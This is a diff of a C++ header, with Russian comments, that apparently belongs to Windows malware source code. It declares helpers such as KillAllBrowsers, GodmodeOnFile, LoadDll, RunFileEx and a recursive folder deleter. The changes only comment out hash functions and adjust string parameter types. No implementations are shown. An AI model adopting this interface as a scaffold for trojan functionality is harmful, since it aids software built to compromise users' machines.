@@ -32,7 +32,7 @@ bool RunFileA(PCHAR FileName);
 
 bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );
 
-char * FileToMD5(char *URL);
+//char * FileToMD5(char *URL);
 
 char *GetOSInfo();
 LPVOID GetInfoTable( DWORD dwTableType );
@@ -42,7 +42,7 @@ HANDLE CreateUpdateMutex();
 DWORD GetCurrentSessionId();
 
 DWORD WINAPI LoadDll( LPVOID lpData );
-DWORD GetFileHash( WCHAR *File );
+//DWORD GetFileHash( WCHAR *File );
 bool GodmodeOnFile( WCHAR *Filename );
 
 
@@ -122,7 +122,8 @@ bool isFileExists(int FlagFolderDest, WCHAR*Path);
 
 bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
 //проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName возвращает его данные
-bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);
+//bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);
+
 //мочим папку со всеми подпапками
 bool DeleteFolders(PCHAR From);
 
@@ -240,12 +241,12 @@ namespace Registry
 namespace File
 {
 	// Записать данные из буфера в файл
-	DWORD WriteBufferA(const PCHAR FileName, const LPVOID Buffer, DWORD BufferSize);
-	DWORD WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize);
+	DWORD WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize);
+	DWORD WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize);
 
 	// Прочитать файл в буфер
-	LPBYTE ReadToBufferA(PCHAR FileName, DWORD &BufferSize);
-	LPBYTE ReadToBufferW(PWCHAR FileName, DWORD &BufferSize);
+	LPBYTE ReadToBufferA(const char* FileName, DWORD &BufferSize);
+	LPBYTE ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize);
 
 	// Изменить расширение файла. Касается только строки FileName!!!
 	// Примечание - Расширение меняется вместе с точкой
@@ -351,8 +352,8 @@ bool IsExecutableFile(LPVOID Buf);
 
 
 // функция добавлена при добавлении оперы
-char   *CalcFileMD5Hash(char *szFileName);
-string CalcFileMD5Hash2(char *szFileName);
+//char   *CalcFileMD5Hash(char *szFileName);
+//string CalcFileMD5Hash2(char *szFileName);
 
 char *GetNetInfo();
 DWORD GetFileFormat( WCHAR *lpFileName );
@@ -399,6 +400,7 @@ void KillAllBrowsers();
 //------------------------------------------------------------
 string        GetSpecialFolderPathA(int CSIDL, const char *FileName);
 string inline GetSpecialFolderPathA(int CSIDL, const string &FileName) { return GetSpecialFolderPathA(CSIDL, FileName.t_str()); };
+wstring       GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName);
 
 
 //------------------------------------------------------------
